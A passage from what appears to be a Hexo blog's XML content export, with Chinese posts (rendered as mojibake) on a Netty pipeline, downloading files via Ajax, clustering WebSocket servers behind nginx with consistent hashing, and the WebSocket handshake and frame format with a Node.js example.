ch.pipeline();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// channelInboundHandler1 çº¿ç¨‹å®‰å…¨çš„ï¼Œå¤šChannelPipelineå…±äº«ä¸€ä¸ªã€‚</span></span><br><span class="line">        pipeline.addLast(<span class="string">&quot;channelInboundHandler1&quot;</span>, channelInboundHandler1);</span><br><span class="line">        <span class="comment">// channelInboundHandler1 éçº¿ç¨‹å®‰å…¨çš„ï¼Œä¸ºæ¯ä¸ªChannelPipelineéƒ½åˆ›å»ºä¸€ä¸ªå®ä¾‹ã€‚</span></span><br><span class="line">        pipeline.addLast(<span class="string">&quot;channelInboundHandler2&quot;</span>, <span class="keyword">new</span> <span class="title class_">ChannelInboundHandler2</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> netty </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é€šè¿‡Ajaxä¸‹è½½æ–‡ä»¶</title>
      <link href="/post/file-download-via-ajax.html"/>
      <url>/post/file-download-via-ajax.html</url>
      
        <content type="html"><![CDATA[<h2 id="é€šè¿‡Ajaxä¸‹è½½æ–‡ä»¶"><a href="#é€šè¿‡Ajaxä¸‹è½½æ–‡ä»¶" class="headerlink" title="é€šè¿‡Ajaxä¸‹è½½æ–‡ä»¶"></a>é€šè¿‡Ajaxä¸‹è½½æ–‡ä»¶</h2><p>å‚è€ƒç½‘ç«™<a href="https://send.firefox.com/">https://send.firefox.com/</a> <a href="https://github.com/mozilla/send">Github</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;GetFile&quot;</span>&gt;</span>Get File!<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><figcaption><span>file_download_via_ajax.js</span><a href="/downloads/code/file_download_via_ajax.js">view raw</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&#x27;#GetFile&#x27;</span>).<span class="title function_">on</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line">    $.<span class="title function_">ajax</span>({</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&#x27;https://kekek.cc/static/P60524-122812.jpg&#x27;</span>,</span><br><span class="line">        <span class="attr">xhr</span>: <span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line">            <span class="keyword">var</span> xhr = $.ajaxSettings.<span class="title function_">xhr</span>();</span><br><span class="line">            xhr.<span class="property">onprogress</span> = <span class="keyword">function</span> (<span class="params">e</span>) {</span><br><span class="line">                <span class="comment">// For downloads</span></span><br><span class="line">                <span class="keyword">if</span> (e.<span class="property">lengthComputable</span>) {</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">loaded</span> / e.<span class="property">total</span>);</span><br><span class="line">                }</span><br><span class="line">            };</span><br><span class="line">            xhr.<span class="property">upload</span>.<span class="property">onprogress</span> = <span class="keyword">function</span> (<span class="params">e</span>) {</span><br><span class="line">                <span class="comment">// For uploads</span></span><br><span class="line">                <span class="keyword">if</span> (e.<span class="property">lengthComputable</span>) {</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">loaded</span> / e.<span class="property">total</span>);</span><br><span class="line">                }</span><br><span class="line">            };</span><br><span class="line">            <span class="keyword">return</span> xhr;</span><br><span class="line">        },</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">        <span class="attr">xhrFields</span>: {</span><br><span class="line">            <span class="attr">responseType</span>: <span class="string">&#x27;blob&#x27;</span></span><br><span class="line">        },</span><br><span class="line">        <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) {</span><br><span class="line">            <span class="keyword">var</span> a = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">            <span class="keyword">var</span> url = <span class="variable language_">window</span>.<span class="property">URL</span>.<span class="title function_">createObjectURL</span>(data);</span><br><span class="line">            a.<span class="property">href</span> = url;</span><br><span class="line">            a.<span class="property">download</span> = <span class="string">&#x27;P60524.jpg&#x27;</span>;</span><br><span class="line">            a.<span class="title function_">click</span>();</span><br><span class="line">            <span class="variable language_">window</span>.<span class="property">URL</span>.<span class="title function_">revokeObjectURL</span>(url);</span><br><span class="line">        }</span><br><span class="line">    });</span><br><span class="line">});</span><br></pre></td></tr></table></figure><iframe src="https://kekek.cc/static/file-download-via-ajax.html" width="100%" height="80px" frameborder="0" loading="lazy" allowfullscreen></iframe><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://codepen.io/chrisdpratt/pen/RKxJNo">File Download via AJAX</a></li><li><a href="https://coderwall.com/p/je3uww/get-progress-of-an-ajax-request">Get progress of an AJAX request</a></li><li><a href="https://github.com/mozilla/send/blob/master/app/api.js#L140">Mozilla&#x2F;send</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ajax </tag>
            
            <tag> download </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebSocketæœåŠ¡é›†ç¾¤</title>
      <link href="/post/distributed-websocket.html"/>
      <url>/post/distributed-websocket.html</url>
      
        <content type="html"><![CDATA[<h2 id="WebSocketæœåŠ¡é›†ç¾¤"><a href="#WebSocketæœåŠ¡é›†ç¾¤" class="headerlink" title="WebSocketæœåŠ¡é›†ç¾¤"></a>WebSocketæœåŠ¡é›†ç¾¤</h2><p>ç½‘ç»œå¥—æ¥å­—åªèƒ½åœ¨å†…å­˜ä¸­ç»´æŠ¤ï¼Œå¤šå®ä¾‹æ—¶å°±ä¼šé‡åˆ°ä¸€ä¸ªé—®é¢˜ã€‚å¦‚æœAå’ŒBå‘æ¶ˆæ¯ï¼Œå¦‚æœABåœ¨ä¸€å°æœºå™¨ã€‚æ‰¾åˆ°Bçš„å¥—æ¥å­—å°±å¯ä»¥å‘é€æ¶ˆæ¯äº†ï¼Œå¦‚æœABä¸åœ¨åŒä¸€å°æœºå™¨å°±éœ€è¦æ¶ˆæ¯è½¬å‘ã€‚æˆ‘ä»¬è¦è®°å½•ABåˆ†åˆ«åœ¨å“ªå°æœºå™¨ï¼Œå½“Aè¦ç»™Bå‘æ¶ˆæ¯æ—¶å…ˆæŸ¥åˆ°Bæ‰€åœ¨çš„æœºå™¨ï¼Œç›´æ¥å°†æ­¤æ¶ˆæ¯è½¬å‘ç»™Bæ‰€åœ¨çš„æœºå™¨ï¼Œç„¶åæœ‰å®ƒç»™Bå‘æ¶ˆæ¯ã€‚</p><p>å¦‚æœæ¶ˆæ¯å¤§è§„æ¨¡çš„éœ€è¦å†…éƒ¨è½¬å‘ï¼Œç³»ç»Ÿå°±ä¼šå˜å¾—æ¯”è¾ƒå¤æ‚å¹¶ä¸”å› ä¸ºæœ‰è½¬å‘çš„è¿‡ç¨‹æ•ˆç‡å°†ä¸ä¼šå¾ˆé«˜ã€‚æˆ‘ä»¬åº”è¯¥å°½å¯èƒ½çš„è®©è¦å‘æ¶ˆæ¯çš„ä¸¤ä¸ªäººå°½é‡åœ¨ä¸€å°æœºå™¨ï¼Œå‡å°‘è½¬å‘çš„å‡ ç‡ã€‚</p><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¼šç»™è¦äº’å‘æ¶ˆæ¯çš„ç”¨æˆ·ç»´æŠ¤ä¸€ä¸ªè™šæ‹Ÿçš„æˆ¿é—´ã€‚ä¾‹å¦‚Aå‘æ¶ˆæ¯ç»™Bæ—¶æ¶ˆæ¯ç›´æ¥å‘ç»™æ­¤æˆ¿é—´ï¼Œæ­¤æˆ¿é—´å°†æ¶ˆæ¯è½¬å‘ç»™Bã€‚</p><p>æˆ‘ä»¬ä½¿ç”¨çš„WebSocketåè®®æ˜¯åœ¨HTTP&#x2F;1.1åè®®ä¸Šå‡çº§è€Œæˆçš„ï¼Œè¿™é‡Œæˆ‘ä»¬èƒ½æ‹¿åˆ°URLï¼Œå¦‚æœå°†è™šæ‹Ÿæˆ¿é—´å·æ·»åŠ åˆ°URLä¸­ã€‚å‰ç½®è´Ÿè½½æ ¹æ®URLè¿›è¡Œè´Ÿè½½ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½å°†åŒä¸€ä¸ªæˆ¿é—´çš„ä¸¤ä¸ªäººåˆ†é…åˆ°ä¸€å°æœºå™¨ä¸Šã€‚</p><p>è¿™é‡Œé¢æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œé»˜è®¤æƒ…å†µä¸‹æˆ‘ä»¬å°†åŒä¸€ä¸ªæˆ¿é—´çš„ç”¨æˆ·éƒ½ä¼šåˆ†æ´¾åˆ°ä¸€å°æœºå™¨ã€‚ä½†æ˜¯å¦‚æœæˆ‘ä»¬æ·»åŠ æœºå™¨æ—¶åŸæ¥çš„æœºå™¨é¡ºåºå°±ä¼šè¢«æ‰“ä¹±ï¼Œå¯èƒ½ä¼šå°†æˆ¿é—´çš„æ–°ç”¨æˆ·åˆ†é…åˆ°å¦å¤–ä¸€å°æœºå™¨ã€‚è¿™æ—¶æˆ‘ä»¬å°±éœ€è¦<a href="/2017/10/16/consistent-hashing/">ä¸€è‡´æ€§Hash</a>ï¼Œè™½ç„¶æ˜¯ä¸€è‡´æ€§Hashä½†æ˜¯è¿˜æ˜¯ä¼šæœ‰å°‘æ•°çš„ç”¨æˆ·è¢«åˆ†é…åˆ°å…¶å®ƒæœåŠ¡å™¨ä¸Šå»ã€‚ä½†æ˜¯ç°åœ¨å·²ç»å¤§å¤§å‡å°‘å†…éƒ¨æ¶ˆæ¯è½¬å‘ï¼Œåªæœ‰éƒ¨åˆ†ç‰¹åˆ«çš„æƒ…å†µä¸‹éœ€è¦åšå°‘é‡æ¶ˆæ¯çš„è½¬å‘ã€‚</p><p><img src="/images/distributed-websocket.jpg"></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="attribute">map</span> <span class="variable">$http_upgrade</span> <span class="variable">$connection_upgrade</span> &#123;</span><br><span class="line">        <span class="attribute">default</span> upgrade;</span><br><span class="line">        &#x27;&#x27;      close;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="section">upstream</span> websocket &#123;</span><br><span class="line">        <span class="attribute">server</span> <span class="number">127.0.0.1:8081</span>;</span><br><span class="line">        <span class="attribute">server</span> <span class="number">127.0.0.1:8082</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ä¸€è‡´æ€§Hash</span></span><br><span class="line">        <span class="attribute">hash</span> <span class="variable">$request_uri</span> consistent;</span><br><span class="line">        <span class="comment"># hash_method crc32;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span>       <span class="number">8080</span>;</span><br><span class="line">        ...</span><br><span class="line">        <span class="section">location</span><span class="regexp"> ^~</span> /ws &#123;</span><br><span class="line">            <span class="attribute">proxy_pass</span> http://websocket;</span><br><span class="line">            <span class="attribute">proxy_read_timeout</span> <span class="number">1d</span>;</span><br><span class="line"></span><br><span class="line">            <span class="attribute">proxy_http_version</span> <span class="number">1</span>.<span class="number">1</span>;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> Upgrade <span class="variable">$http_upgrade</span>;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> Connection <span class="variable">$connection_upgrade</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="http://nginx.org/en/docs/http/websocket.html">WebSocket proxying</a></li><li><a href="http://nginx.org/en/docs/http/ngx_http_upstream_module.html#hash">Module ngx_http_upstream_module</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> websocket </tag>
            
            <tag> distributed </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebSocketåè®®</title>
      <link href="/post/websocket.html"/>
      <url>/post/websocket.html</url>
      
        <content type="html"><![CDATA[<h2 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h2><p>HTTPæ˜¯<code>è¯·æ±‚å“åº”</code>æ¨¡å‹ï¼Œåœ¨è¿™ä¸ªæ¨¡å‹ä¸‹æœåŠ¡å™¨ç«¯æ˜¯ä¸èƒ½ä¸»åŠ¨å‘æ¶ˆæ¯ç»™å®¢æˆ·ç«¯çš„ã€‚è¿™åœ¨å¾ˆå¤šåœºæ™¯ä¸‹æœ‰è¯¸å¤šä¸ä¾¿ï¼Œä¾‹å¦‚æ¶ˆæ¯é€šçŸ¥ç­‰ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œ<code>WebSocket</code>åº”è¿è€Œç”Ÿã€‚</p><p>åœ¨æ²¡æœ‰<code>WebSocket</code>ä¹‹å‰ï¼Œæˆ‘ä»¬ä¸»è¦é€šè¿‡è½®è¯¢æ¥å®ç°æ¶ˆæ¯æ¨é€ã€‚ä¸ºäº†æé«˜æ¶ˆæ¯çš„<code>å®æ—¶æ€§</code>æˆ‘ä»¬è¦æé«˜è½®è¯¢é¢‘ç‡ï¼Œè½®è¯¢é¢‘ç‡æé«˜åä¼šç»™ç³»ç»Ÿé€ æˆä¸€äº›å‹åŠ›ã€‚</p><h3 id="åè®®å®ç°"><a href="#åè®®å®ç°" class="headerlink" title="åè®®å®ç°"></a>åè®®å®ç°</h3><p><img src="/images/websocket.jpg"><br>åœ¨æµè§ˆå™¨ä¸­WebSocketé€šè¿‡HTTPçš„<a href="https://httpwg.org/specs/rfc7230.html#header.upgrade">åè®®å‡çº§</a>æ¥å®ç°ã€‚è¦å‘èµ· HTTP&#x2F;1.1 åè®®å‡çº§ï¼Œå®¢æˆ·ç«¯å¿…é¡»åœ¨è¯·æ±‚å¤´éƒ¨ä¸­æŒ‡å®šè¿™ä¸¤ä¸ªå­—æ®µï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Connection: Upgrade</span><br><span class="line">Upgrade: protocol-name[/protocol-version]</span><br></pre></td></tr></table></figure><p>å¦‚æœæœåŠ¡ç«¯ä¸åŒæ„å‡çº§æˆ–è€…ä¸æ”¯æŒ Upgrade æ‰€åˆ—å‡ºçš„åè®®ï¼Œç›´æ¥å¿½ç•¥å³å¯ï¼ˆå½“æˆ HTTP&#x2F;1.1 è¯·æ±‚ï¼Œä»¥ HTTP&#x2F;1.1 å“åº”ï¼‰ï¼›å¦‚æœæœåŠ¡ç«¯åŒæ„å‡çº§ï¼Œé‚£ä¹ˆéœ€è¦è¿™æ ·å“åº”ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 101 Switching Protocols</span><br><span class="line">Connection: upgrade</span><br><span class="line">Upgrade: protocol-name[/protocol-version]</span><br><span class="line"></span><br><span class="line">[... data defined by new protocol ...]</span><br></pre></td></tr></table></figure><p>åè®®å®Œæˆå‡çº§åå°±å’ŒHTTPåè®®æ²¡æœ‰å…³ç³»äº†ï¼Œå‰©ä¸‹çš„æ•°æ®éƒ½ä»¥<code>WebSocket</code>åè®®è¿›è¡Œä¼ è¾“ã€‚</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªé€šè¿‡HTTPå»ºç«‹WebSocketè¯·æ±‚çš„ä¾‹å­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># è¯·æ±‚å¤´</span><br><span class="line">GET ws://example.com/ HTTP/1.1</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Connection: Upgrade</span><br><span class="line">Host: 127.0.0.1:8081</span><br><span class="line">Origin: http://example.com</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits</span><br><span class="line">Sec-WebSocket-Key: /3ZaE3COLK+dw4pHqCTarQ==</span><br><span class="line">Sec-WebSocket-Version: 13</span><br><span class="line">Upgrade: websocket</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36</span><br><span class="line"></span><br><span class="line"># å“åº”å¤´</span><br><span class="line">HTTP/1.1 101 Switching Protocols</span><br><span class="line">connection: upgrade</span><br><span class="line">sec-websocket-accept: EMUWrlnRHG2LyGmmWMuWoFyBxnI=</span><br><span class="line">upgrade: websocket</span><br></pre></td></tr></table></figure><p>å­—æ®µè¯´æ˜ï¼š</p><ul><li>Connectionå¿…é¡»è®¾ç½®Upgradeï¼Œè¡¨ç¤ºå®¢æˆ·ç«¯å¸Œæœ›è¿æ¥å‡çº§ã€‚</li><li>Upgradeå­—æ®µå¿…é¡»è®¾ç½®WebSocketï¼Œè¡¨ç¤ºå¸Œæœ›å‡çº§åˆ°WebSocketåè®®ã€‚</li><li>Sec-WebSocket-Keyæ˜¯éšæœºçš„å­—ç¬¦ä¸²ï¼ŒæœåŠ¡å™¨ç«¯ä¼šç”¨è¿™äº›æ•°æ®æ¥æ„é€ å‡ºä¸€ä¸ªSHA-1çš„ä¿¡æ¯æ‘˜è¦ã€‚æŠŠ<code>Sec-WebSocket-Key</code>åŠ ä¸Šä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ä¸²<code>258EAFA5-E914-47DA-95CA-C5AB0DC85B11</code>ï¼Œç„¶åè®¡ç®—SHA-1æ‘˜è¦ï¼Œä¹‹åè¿›è¡ŒBASE-64ç¼–ç ï¼Œå°†ç»“æœåšä¸º<code>Sec-WebSocket-Accept</code>å¤´çš„å€¼ï¼Œè¿”å›ç»™å®¢æˆ·ç«¯ã€‚å¦‚æ­¤æ“ä½œï¼Œå¯ä»¥å°½é‡é¿å…æ™®é€šHTTPè¯·æ±‚è¢«è¯¯è®¤ä¸ºWebSocketåè®®ã€‚</li><li><code>Sec-WebSocket-Version</code> è¡¨ç¤ºæ”¯æŒçš„WebSocketç‰ˆæœ¬ã€‚RFC6455è¦æ±‚ä½¿ç”¨çš„ç‰ˆæœ¬æ˜¯13ï¼Œä¹‹å‰è‰æ¡ˆçš„ç‰ˆæœ¬å‡åº”å½“å¼ƒç”¨ã€‚</li><li>Originå­—æ®µæ˜¯å¯é€‰çš„ï¼Œé€šå¸¸ç”¨æ¥è¡¨ç¤ºåœ¨æµè§ˆå™¨ä¸­å‘èµ·æ­¤WebSocketè¿æ¥æ‰€åœ¨çš„é¡µé¢ï¼Œç±»ä¼¼äºRefererã€‚ä½†æ˜¯ï¼Œä¸Refererä¸åŒçš„æ˜¯ï¼ŒOriginåªåŒ…å«äº†åè®®å’Œä¸»æœºåç§°ã€‚</li><li>å…¶ä»–ä¸€äº›å®šä¹‰åœ¨HTTPåè®®ä¸­çš„å­—æ®µï¼Œå¦‚Cookieç­‰ï¼Œä¹Ÿå¯ä»¥åœ¨WebSocketä¸­ä½¿ç”¨ã€‚</li></ul><h4 id="æ¡æ‰‹"><a href="#æ¡æ‰‹" class="headerlink" title="æ¡æ‰‹"></a>æ¡æ‰‹</h4><p>è¦ä½¿ç”¨WebSocketé¦–å…ˆå¾—è®©å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å»ºç«‹è¿æ¥ï¼Œé¦–å…ˆéœ€è¦é€šè¿‡éªŒè¯KEYæ¥åšæ¡æ‰‹å·¥ä½œã€‚</p><p>è¿™ä¸ªæ¡æ‰‹åè®®ä½¿ç”¨çš„æ˜¯HTTPæ ¼å¼çš„è¯·æ±‚ï¼Œå¹¶å†å¤´éƒ¨åˆ†å¸¦ä¸Šä¸€ä¸ª<code>Sec-WebSocket-Key</code>å­—æ®µï¼ŒæœåŠ¡å™¨å¯¹è¿™ä¸ªå­—æ®µåŠ ä¸Šä¸€ä¸ªç‰¹å®šçš„å­—ç¬¦ä¸²ååšä¸€æ¬¡sha1è¿ç®—ï¼Œç„¶åæŠŠç»“æœç”¨Base64çš„å½¢å¼ä»¥åŒæ ·çš„æ–¹å¼å‘é€å›å»å°±å¯ä»¥å®Œæˆæ¡æ‰‹çš„å·¥ä½œäº†ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ws-handshake.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> net = <span class="built_in">require</span>(<span class="string">&#x27;net&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">WS</span> = <span class="string">&#x27;258EAFA5-E914-47DA-95CA-C5AB0DC85B11&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = net.<span class="title function_">createServer</span>(<span class="function">(<span class="params">conn</span>) =&gt;</span> &#123;</span><br><span class="line">    conn.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!conn.<span class="property">isWebSocket</span>) &#123;</span><br><span class="line">            <span class="comment">// è·å–å‘é€è¿‡æ¥çš„KEY</span></span><br><span class="line">            <span class="keyword">let</span> secKey = data.<span class="title function_">toString</span>().<span class="title function_">match</span>(<span class="regexp">/Sec-WebSocket-Key: (.+)/i</span>)[<span class="number">1</span>];</span><br><span class="line">            <span class="comment">// è¿æ¥ä¸ŠWSè¿™ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶åšä¸€æ¬¡sha1è¿ç®—ï¼Œæœ€åè½¬æ¢æˆBase64</span></span><br><span class="line">            secKey = crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;sha1&#x27;</span>).<span class="title function_">update</span>(secKey + <span class="variable constant_">WS</span>).<span class="title function_">digest</span>(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">            <span class="comment">// è¾“å‡ºè¿”å›ç»™å®¢æˆ·ç«¯çš„æ•°æ®ï¼Œè¿™äº›å­—æ®µéƒ½æ˜¯å¿…é¡»çš„</span></span><br><span class="line">            conn.<span class="title function_">write</span>(<span class="string">&#x27;HTTP/1.1 101 Switching Protocols\r\n&#x27;</span>);</span><br><span class="line">            conn.<span class="title function_">write</span>(<span class="string">&#x27;Upgrade: websocket\r\n&#x27;</span>);</span><br><span class="line">            conn.<span class="title function_">write</span>(<span class="string">&#x27;Connection: Upgrade\r\n&#x27;</span>);</span><br><span class="line">            <span class="comment">// è¿™ä¸ªå­—æ®µå¸¦ä¸ŠæœåŠ¡å™¨å¤„ç†åçš„KEY</span></span><br><span class="line">            conn.<span class="title function_">write</span>(<span class="string">`Sec-WebSocket-Accept: <span class="subst">$&#123;secKey&#125;</span>\r\n`</span>);</span><br><span class="line">            <span class="comment">// è¾“å‡ºç©ºè¡Œï¼Œä½¿HTTPå¤´ç»“æŸ</span></span><br><span class="line">            conn.<span class="title function_">write</span>(<span class="string">&#x27;\r\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            conn.<span class="property">isWebSocket</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="variable language_">console</span>.<span class="property">error</span>);</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">listen</span>(<span class="number">8124</span>, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;server bound&#x27;</span>));</span><br></pre></td></tr></table></figure><h4 id="è§£ææ•°æ®å¸§"><a href="#è§£ææ•°æ®å¸§" class="headerlink" title="è§£ææ•°æ®å¸§"></a>è§£ææ•°æ®å¸§</h4><p>WebSocketæ•°æ®åŒ…ä¸åƒHTMLæ˜¯çº¯æ–‡æœ¬å½¢å¼çš„ï¼Œå®ƒæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶çš„åè®®åŒ…ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> 0                   1                   2                   3</span><br><span class="line"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="line">+-+-+-+-+-------+-+-------------+-------------------------------+</span><br><span class="line">|F|R|R|R| opcode|M| Payload len |    Extended payload length    |</span><br><span class="line">|I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |</span><br><span class="line">|N|V|V|V|       |S|             |   (if payload len==126/127)   |</span><br><span class="line">| |1|2|3|       |K|             |                               |</span><br><span class="line">+-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +</span><br><span class="line">|     Extended payload length continued, if payload len == 127  |</span><br><span class="line">+ - - - - - - - - - - - - - - - +-------------------------------+</span><br><span class="line">|                               |Masking-key, if MASK set to 1  |</span><br><span class="line">+-------------------------------+-------------------------------+</span><br><span class="line">| Masking-key (continued)       |          Payload Data         |</span><br><span class="line">+-------------------------------- - - - - - - - - - - - - - - - +</span><br><span class="line">:                     Payload Data continued ...                :</span><br><span class="line">+ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +</span><br><span class="line">|                     Payload Data continued ...                |</span><br><span class="line">+---------------------------------------------------------------+</span><br></pre></td></tr></table></figure><ul><li><p>FIN: 1 bit</p><p>  æŒ‡ç¤ºè¿™ä¸ªæ˜¯æ¶ˆæ¯çš„æœ€åç‰‡æ®µã€‚ç¬¬ä¸€ä¸ªç‰‡æ®µå¯èƒ½ä¹Ÿæ˜¯æœ€åçš„ç‰‡æ®µã€‚</p></li><li><p>RSV1, RSV2, RSV3: 1 bit each</p><p>  